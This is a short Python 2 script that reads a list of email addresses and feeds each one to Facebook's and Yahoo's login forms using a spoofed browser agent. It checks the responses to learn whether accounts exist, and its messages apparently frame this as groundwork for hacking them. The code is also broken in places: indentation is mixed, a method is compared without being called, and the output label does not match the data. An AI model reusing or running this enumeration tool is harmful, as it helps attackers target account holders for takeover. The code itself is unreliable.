import mechanize,cookielib,random

	
							          

def menu():		    
    email = "mok.txt"
    k = open(email,"r")
    j = k.readlines()
    for word in j:
        print " TRYING  \033[2;37;40m........ in facebook {}".format(word)
        i = mechanize.Browser()
	i.set_handle_robots(False)
	cj = cookielib.LWPCookieJar()
	i.set_cookiejar(cj)
	i.addheaders = [('User-agent',"""Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16""")]
        print "\033[1;33;40m opening email in facebook "
	url = "http://m.facebook.com/login.php"
	e = i.open(url)
	i.select_form(nr=0)
	i.form["email"] = word 
	p = i.submit()	
        if "incorrect" in p.read():
           print "\033[0;31;40m Trying............in yahoo {}".format(word)
           br = mechanize.Browser()
	   br.set_handle_robots(False)
	   cj = cookielib.LWPCookieJar()
           br.addheaders =  [('User-agent',"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16")]
	   br.set_cookiejar(cj)
	   url = "https://login.yahoo.com"
	   e = br.open(url)
	   br.select_form(nr=0)
	   br.form["username"] = word
	   s = br.submit()
	   print s.geturl()
	   if "password" in s.geturl():
	      print "\033[1;34;40m Email:Has been Not hacked Fuck u  {}".format(word) 
	   elif s.geturl == "https://login.yahoo.com":
			with open("Output.txt", "w") as text_file:
			    text_file.write("Purchase Amount: %s" % word)
menu()

							          	  






   
